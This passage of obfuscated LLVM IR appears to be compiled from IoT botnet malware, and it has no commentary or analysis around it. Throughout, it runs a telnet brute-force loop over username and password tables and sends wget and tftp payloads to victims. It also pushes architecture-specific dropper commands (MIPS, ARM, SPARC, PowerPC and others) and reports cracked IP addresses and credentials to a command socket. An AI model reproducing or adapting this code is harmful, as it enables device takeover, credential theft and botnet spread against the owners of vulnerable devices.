  %848 = load i8, i8* %847, align 1
  %849 = zext i8 %848 to i64
  %850 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %849
  %851 = load i8*, i8** %850, align 8
  %852 = call i32 (i32, i8*, ...) @sockprintf(i32 %827, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.284, i32 0, i32 0), i8* %835, i8* %843, i8* %851)
  %853 = load i32, i32* %6, align 4
  %854 = sext i32 %853 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %854
  %856 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %855, i32 0, i32 0
  %857 = load i32, i32* %856, align 16
  %858 = load i8*, i8** @wgetpayload, align 8
  %859 = load i8*, i8** @wgetpayload, align 8
  %860 = call i64 @strlen(i8* %859) #9
  %861 = call i64 @send(i32 %857, i8* %858, i64 %860, i32 16384)
  %862 = icmp slt i64 %861, 0
  %863 = select i1 %862, i32 2003421001, i32 1184162416
  store i32 %863, i32* %switchVar
  br label %loopEnd

; <label>:864:                                    ; preds = %loopEntry
  %865 = load i32, i32* %6, align 4
  %866 = sext i32 %865 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %866
  call void @reset_telstate(%struct.telstate_t* %867)
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:868:                                    ; preds = %loopEntry
  %869 = load i32, i32* %6, align 4
  %870 = sext i32 %869 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %870
  call void @advance_telstate(%struct.telstate_t* %871, i32 16)
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:872:                                    ; preds = %loopEntry
  %873 = load i32, i32* @mainCommSock, align 4
  %874 = load i32, i32* %6, align 4
  %875 = sext i32 %874 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %875
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %876, i32 0, i32 1
  %878 = bitcast i32* %877 to %struct.in_addr*
  %879 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %878, i32 0, i32 0
  %880 = load i32, i32* %879, align 4
  %881 = call i8* @inet_ntoa(i32 %880) #5
  %882 = load i32, i32* %6, align 4
  %883 = sext i32 %882 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %883
  %885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %884, i32 0, i32 4
  %886 = load i8, i8* %885, align 2
  %887 = zext i8 %886 to i64
  %888 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %887
  %889 = load i8*, i8** %888, align 8
  %890 = load i32, i32* %6, align 4
  %891 = sext i32 %890 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %892 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %891
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %892, i32 0, i32 5
  %894 = load i8, i8* %893, align 1
  %895 = zext i8 %894 to i64
  %896 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %895
  %897 = load i8*, i8** %896, align 8
  %898 = call i32 (i32, i8*, ...) @sockprintf(i32 %873, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.285, i32 0, i32 0), i8* %881, i8* %889, i8* %897)
  %899 = load i32, i32* %6, align 4
  %900 = sext i32 %899 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %900
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %901, i32 0, i32 0
  %903 = load i32, i32* %902, align 16
  %904 = load i8*, i8** @tftppayload, align 8
  %905 = load i8*, i8** @tftppayload, align 8
  %906 = call i64 @strlen(i8* %905) #9
  %907 = call i64 @send(i32 %903, i8* %904, i64 %906, i32 16384)
  %908 = icmp slt i64 %907, 0
  %909 = select i1 %908, i32 1859029299, i32 443681448
  store i32 %909, i32* %switchVar
  br label %loopEnd

; <label>:910:                                    ; preds = %loopEntry
  %911 = load i32, i32* %6, align 4
  %912 = sext i32 %911 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %912
  call void @reset_telstate(%struct.telstate_t* %913)
  store i32 -232975211, i32* %switchVar
  br label %loopEnd

; <label>:914:                                    ; preds = %loopEntry
  %915 = load i32, i32* %6, align 4
  %916 = sext i32 %915 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %916
  call void @advance_telstate(%struct.telstate_t* %917, i32 16)
  store i32 1726154473, i32* %switchVar
  br label %loopEnd

; <label>:918:                                    ; preds = %loopEntry
  %919 = load i32, i32* @mainCommSock, align 4
  %920 = load i32, i32* %6, align 4
  %921 = sext i32 %920 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %921
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %922, i32 0, i32 1
  %924 = bitcast i32* %923 to %struct.in_addr*
  %925 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %924, i32 0, i32 0
  %926 = load i32, i32* %925, align 4
  %927 = call i8* @inet_ntoa(i32 %926) #5
  %928 = load i32, i32* %6, align 4
  %929 = sext i32 %928 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %929
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %930, i32 0, i32 4
  %932 = load i8, i8* %931, align 2
  %933 = zext i8 %932 to i64
  %934 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %933
  %935 = load i8*, i8** %934, align 8
  %936 = load i32, i32* %6, align 4
  %937 = sext i32 %936 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %937
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %938, i32 0, i32 5
  %940 = load i8, i8* %939, align 1
  %941 = zext i8 %940 to i64
  %942 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %941
  %943 = load i8*, i8** %942, align 8
  %944 = call i32 (i32, i8*, ...) @sockprintf(i32 %919, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.286, i32 0, i32 0), i8* %927, i8* %935, i8* %943)
  store i32 0, i32* %29, align 4
  store i32 0, i32* %29, align 4
  store i32 1409175765, i32* %switchVar
  br label %loopEnd

; <label>:945:                                    ; preds = %loopEntry
  %946 = load i32, i32* %29, align 4
  %947 = icmp slt i32 %946, 1
  %948 = select i1 %947, i32 1299992131, i32 363268824
  store i32 %948, i32* %switchVar
  br label %loopEnd

; <label>:949:                                    ; preds = %loopEntry
  %950 = load i32, i32* %6, align 4
  %951 = sext i32 %950 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %951
  %953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %952, i32 0, i32 0
  %954 = load i32, i32* %953, align 16
  %955 = load i32, i32* %29, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_mips, i64 0, i64 %956
  %958 = load i8*, i8** %957, align 8
  %959 = call i32 (i32, i8*, ...) @sockprintf(i32 %954, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %958)
  %960 = icmp slt i32 %959, 0
  %961 = select i1 %960, i32 1630869147, i32 566977417
  store i32 %961, i32* %switchVar
  br label %loopEnd

; <label>:962:                                    ; preds = %loopEntry
  %963 = load i32, i32* %6, align 4
  %964 = sext i32 %963 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %964
  call void @reset_telstate(%struct.telstate_t* %965)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:966:                                    ; preds = %loopEntry
  %967 = load i32, i32* %6, align 4
  %968 = sext i32 %967 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %968
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %969, i32 0, i32 0
  %971 = load i32, i32* %970, align 16
  %972 = load i32, i32* %29, align 4
  %973 = sext i32 %972 to i64
  %974 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_mipsel, i64 0, i64 %973
  %975 = load i8*, i8** %974, align 8
  %976 = call i32 (i32, i8*, ...) @sockprintf(i32 %971, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %975)
  %977 = icmp slt i32 %976, 0
  %978 = select i1 %977, i32 384889035, i32 783797998
  store i32 %978, i32* %switchVar
  br label %loopEnd

; <label>:979:                                    ; preds = %loopEntry
  %980 = load i32, i32* %6, align 4
  %981 = sext i32 %980 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %981
  call void @reset_telstate(%struct.telstate_t* %982)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:983:                                    ; preds = %loopEntry
  %984 = load i32, i32* %6, align 4
  %985 = sext i32 %984 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %985
  %987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %986, i32 0, i32 0
  %988 = load i32, i32* %987, align 16
  %989 = load i32, i32* %29, align 4
  %990 = sext i32 %989 to i64
  %991 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_sh4, i64 0, i64 %990
  %992 = load i8*, i8** %991, align 8
  %993 = call i32 (i32, i8*, ...) @sockprintf(i32 %988, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %992)
  %994 = icmp slt i32 %993, 0
  %995 = select i1 %994, i32 -1817392603, i32 1891183815
  store i32 %995, i32* %switchVar
  br label %loopEnd

; <label>:996:                                    ; preds = %loopEntry
  %997 = load i32, i32* %6, align 4
  %998 = sext i32 %997 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %998
  call void @reset_telstate(%struct.telstate_t* %999)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1000:                                   ; preds = %loopEntry
  %1001 = load i32, i32* %6, align 4
  %1002 = sext i32 %1001 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1003 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %1002
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1003, i32 0, i32 0
  %1005 = load i32, i32* %1004, align 16
  %1006 = load i32, i32* %29, align 4
  %1007 = sext i32 %1006 to i64
  %1008 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_x86_64, i64 0, i64 %1007
  %1009 = load i8*, i8** %1008, align 8
  %1010 = call i32 (i32, i8*, ...) @sockprintf(i32 %1005, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1009)
  %1011 = icmp slt i32 %1010, 0
  %1012 = select i1 %1011, i32 -216000045, i32 433103313
  store i32 %1012, i32* %switchVar
  br label %loopEnd

; <label>:1013:                                   ; preds = %loopEntry
  %1014 = load i32, i32* %6, align 4
  %1015 = sext i32 %1014 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %1015
  call void @reset_telstate(%struct.telstate_t* %1016)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1017:                                   ; preds = %loopEntry
  %1018 = load i32, i32* %6, align 4
  %1019 = sext i32 %1018 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1020 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %1019
  %1021 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1020, i32 0, i32 0
  %1022 = load i32, i32* %1021, align 16
  %1023 = load i32, i32* %29, align 4
  %1024 = sext i32 %1023 to i64
  %1025 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_armv6l, i64 0, i64 %1024
  %1026 = load i8*, i8** %1025, align 8
  %1027 = call i32 (i32, i8*, ...) @sockprintf(i32 %1022, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1026)
  %1028 = icmp slt i32 %1027, 0
  %1029 = select i1 %1028, i32 -1326271790, i32 -1875638948
  store i32 %1029, i32* %switchVar
  br label %loopEnd

; <label>:1030:                                   ; preds = %loopEntry
  %1031 = load i32, i32* %6, align 4
  %1032 = sext i32 %1031 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %1032
  call void @reset_telstate(%struct.telstate_t* %1033)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1034:                                   ; preds = %loopEntry
  %1035 = load i32, i32* %6, align 4
  %1036 = sext i32 %1035 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %1036
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1037, i32 0, i32 0
  %1039 = ptrtoint i32* %1038 to i32
  %1040 = load i32, i32* %29, align 4
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_i686, i64 0, i64 %1041
  %1043 = load i8*, i8** %1042, align 8
  %1044 = call i32 (i32, i8*, ...) @sockprintf(i32 %1039, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1043)
  %1045 = icmp slt i32 %1044, 0
  %1046 = select i1 %1045, i32 2136347610, i32 -1398820981
  store i32 %1046, i32* %switchVar
  br label %loopEnd

; <label>:1047:                                   ; preds = %loopEntry
  %1048 = load i32, i32* %6, align 4
  %1049 = sext i32 %1048 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %1049
  call void @reset_telstate(%struct.telstate_t* %1050)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1051:                                   ; preds = %loopEntry
  %1052 = load i32, i32* %6, align 4
  %1053 = sext i32 %1052 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %1053
  %1055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1054, i32 0, i32 0
  %1056 = ptrtoint i32* %1055 to i32
  %1057 = load i32, i32* %29, align 4
  %1058 = sext i32 %1057 to i64
  %1059 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_powerpc, i64 0, i64 %1058
  %1060 = load i8*, i8** %1059, align 8
  %1061 = call i32 (i32, i8*, ...) @sockprintf(i32 %1056, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1060)
  %1062 = icmp slt i32 %1061, 0
  %1063 = select i1 %1062, i32 1364434448, i32 -51067289
  store i32 %1063, i32* %switchVar
  br label %loopEnd

; <label>:1064:                                   ; preds = %loopEntry
  %1065 = load i32, i32* %6, align 4
  %1066 = sext i32 %1065 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %1066
  call void @reset_telstate(%struct.telstate_t* %1067)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1068:                                   ; preds = %loopEntry
  %1069 = load i32, i32* %6, align 4
  %1070 = sext i32 %1069 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %1070
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1071, i32 0, i32 0
  %1073 = ptrtoint i32* %1072 to i32
  %1074 = load i32, i32* %29, align 4
  %1075 = sext i32 %1074 to i64
  %1076 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_i586, i64 0, i64 %1075
  %1077 = load i8*, i8** %1076, align 8
  %1078 = call i32 (i32, i8*, ...) @sockprintf(i32 %1073, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1077)
  %1079 = icmp slt i32 %1078, 0
  %1080 = select i1 %1079, i32 -999557027, i32 796383090
  store i32 %1080, i32* %switchVar
  br label %loopEnd

; <label>:1081:                                   ; preds = %loopEntry
  %1082 = load i32, i32* %6, align 4
  %1083 = sext i32 %1082 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %1083
  call void @reset_telstate(%struct.telstate_t* %1084)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1085:                                   ; preds = %loopEntry
  %1086 = load i32, i32* %6, align 4
  %1087 = sext i32 %1086 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %1087
  %1089 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1088, i32 0, i32 0
  %1090 = ptrtoint i32* %1089 to i32
  %1091 = load i32, i32* %29, align 4
  %1092 = sext i32 %1091 to i64
  %1093 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_m68k, i64 0, i64 %1092
  %1094 = load i8*, i8** %1093, align 8
  %1095 = call i32 (i32, i8*, ...) @sockprintf(i32 %1090, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1094)
  %1096 = icmp slt i32 %1095, 0
  %1097 = select i1 %1096, i32 1455729727, i32 861878202
  store i32 %1097, i32* %switchVar
  br label %loopEnd

; <label>:1098:                                   ; preds = %loopEntry
  %1099 = load i32, i32* %6, align 4
  %1100 = sext i32 %1099 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %1100
  call void @reset_telstate(%struct.telstate_t* %1101)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1102:                                   ; preds = %loopEntry
  %1103 = load i32, i32* %6, align 4
  %1104 = sext i32 %1103 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %1104
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1105, i32 0, i32 0
  %1107 = ptrtoint i32* %1106 to i32
  %1108 = load i32, i32* %29, align 4
  %1109 = sext i32 %1108 to i64
  %1110 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_sparc, i64 0, i64 %1109
  %1111 = load i8*, i8** %1110, align 8
  %1112 = call i32 (i32, i8*, ...) @sockprintf(i32 %1107, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1111)
  %1113 = icmp slt i32 %1112, 0
  %1114 = select i1 %1113, i32 -1388518845, i32 -834825637
  store i32 %1114, i32* %switchVar
  br label %loopEnd

; <label>:1115:                                   ; preds = %loopEntry
  %1116 = load i32, i32* %6, align 4
  %1117 = sext i32 %1116 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %1117
  call void @reset_telstate(%struct.telstate_t* %1118)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1119:                                   ; preds = %loopEntry
  %1120 = load i32, i32* %6, align 4
  %1121 = sext i32 %1120 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %1121
  %1123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1122, i32 0, i32 0
  %1124 = ptrtoint i32* %1123 to i32
  %1125 = load i32, i32* %29, align 4
  %1126 = sext i32 %1125 to i64
  %1127 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_armv4l, i64 0, i64 %1126
  %1128 = load i8*, i8** %1127, align 8
  %1129 = call i32 (i32, i8*, ...) @sockprintf(i32 %1124, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1128)
  %1130 = icmp slt i32 %1129, 0
  %1131 = select i1 %1130, i32 -1618128519, i32 -1164917999
  store i32 %1131, i32* %switchVar
  br label %loopEnd

; <label>:1132:                                   ; preds = %loopEntry
  %1133 = load i32, i32* %6, align 4
  %1134 = sext i32 %1133 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %1134
  call void @reset_telstate(%struct.telstate_t* %1135)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1136:                                   ; preds = %loopEntry
  %1137 = load i32, i32* %6, align 4
  %1138 = sext i32 %1137 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %1138
  %1140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1139, i32 0, i32 0
  %1141 = load i32, i32* %1140, align 16
  %1142 = load i32, i32* %29, align 4
  %1143 = sext i32 %1142 to i64
  %1144 = getelementptr inbounds [2 x i8*], [2 x i8*]* @dropper_armv5l, i64 0, i64 %1143
  %1145 = load i8*, i8** %1144, align 8
  %1146 = call i32 (i32, i8*, ...) @sockprintf(i32 %1141, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i8* %1145)
  %1147 = icmp slt i32 %1146, 0
  %1148 = select i1 %1147, i32 -469698443, i32 -1368132898
  store i32 %1148, i32* %switchVar
  br label %loopEnd

; <label>:1149:                                   ; preds = %loopEntry
  %1150 = load i32, i32* %6, align 4
  %1151 = sext i32 %1150 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %1151
  call void @reset_telstate(%struct.telstate_t* %1152)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1153:                                   ; preds = %loopEntry
  %1154 = load i32, i32* %6, align 4
  %1155 = sext i32 %1154 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %1155
  %1157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1156, i32 0, i32 0
  %1158 = load i32, i32* %1157, align 16
  %1159 = load i8*, i8** @dropper_powerpc440fp, align 8
  %1160 = load i32, i32* %29, align 4
  %1161 = sext i32 %1160 to i64
  %1162 = getelementptr inbounds i8, i8* %1159, i64 %1161
  %1163 = load i8, i8* %1162, align 1
  %1164 = sext i8 %1163 to i32
  %1165 = call i32 (i32, i8*, ...) @sockprintf(i32 %1158, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.287, i32 0, i32 0), i32 %1164)
  %1166 = icmp slt i32 %1165, 0
  %1167 = select i1 %1166, i32 553269592, i32 -1257339028
  store i32 %1167, i32* %switchVar
  br label %loopEnd

; <label>:1168:                                   ; preds = %loopEntry
  %1169 = load i32, i32* %6, align 4
  %1170 = sext i32 %1169 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %1170
  call void @reset_telstate(%struct.telstate_t* %1171)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1172:                                   ; preds = %loopEntry
  %1173 = load i32, i32* @mainCommSock, align 4
  %1174 = load i32, i32* %6, align 4
  %1175 = sext i32 %1174 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %1175
  %1177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1176, i32 0, i32 1
  %1178 = bitcast i32* %1177 to %struct.in_addr*
  %1179 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1178, i32 0, i32 0
  %1180 = load i32, i32* %1179, align 4
  %1181 = call i8* @inet_ntoa(i32 %1180) #5
  %1182 = load i32, i32* %6, align 4
  %1183 = sext i32 %1182 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1184 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %1183
  %1185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1184, i32 0, i32 4
  %1186 = load i8, i8* %1185, align 2
  %1187 = zext i8 %1186 to i64
  %1188 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %1187
  %1189 = load i8*, i8** %1188, align 8
  %1190 = load i32, i32* %6, align 4
  %1191 = sext i32 %1190 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem36
  %1192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %1191
  %1193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1192, i32 0, i32 5
  %1194 = load i8, i8* %1193, align 1
  %1195 = zext i8 %1194 to i64
  %1196 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %1195
  %1197 = load i8*, i8** %1196, align 8
  %1198 = call i32 (i32, i8*, ...) @sockprintf(i32 %1173, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.288, i32 0, i32 0), i8* %1181, i8* %1189, i8* %1197)
  store i32 896060771, i32* %switchVar
  br label %loopEnd

; <label>:1199:                                   ; preds = %loopEntry
  store i32 -761167471, i32* %switchVar
  br label %loopEnd

; <label>:1200:                                   ; preds = %loopEntry
  store i32 -1098139706, i32* %switchVar
  br label %loopEnd

; <label>:1201:                                   ; preds = %loopEntry
  store i32 1789322532, i32* %switchVar
  br label %loopEnd

; <label>:1202:                                   ; preds = %loopEntry
  store i32 1955769108, i32* %switchVar
  br label %loopEnd

; <label>:1203:                                   ; preds = %loopEntry
  store i32 -907651884, i32* %switchVar
  br label %loopEnd

; <label>:1204:                                   ; preds = %loopEntry
  store i32 -868903328, i32* %switchVar
  br label %loopEnd

; <label>:1205:                                   ; preds = %loopEntry
  store i32 1886591571, i32* %switchVar
  br label %loopEnd

; <label>:1206:                                   ; preds = %loopEntry
  store i32 -8409751, i32* %switchVar
  br label %loopEnd

; <label>:1207:                                   ; preds = %loopEntry
  store i32 -985334739, i32* %switchVar
  br label %loopEnd

; <label>:1208:                                   ; preds = %loopEntry
  store i32 -1513817860, i32* %switchVar
  br label %loopEnd

; <label>:1209:                                   ; preds = %loopEntry
  store i32 -1332436228, i32* %switchVar
  br label %loopEnd

; <label>:1210:                                   ; preds = %loopEntry
  store i32 1531191070, i32* %switchVar
  br label %loopEnd

; <label>:1211:                                   ; preds = %loopEntry
  %1212 = call i32 @sleep(i32 1)
  store i32 2049355519, i32* %switchVar
  br label %loopEnd

; <label>:1213:                                   ; preds = %loopEntry
  %1214 = load i32, i32* %29, align 4
  %1215 = add nsw i32 %1214, 1
  store i32 %1215, i32* %29, align 4
  store i32 1409175765, i32* %switchVar
  br label %loopEnd

; <label>:1216:                                   ; preds = %loopEntry
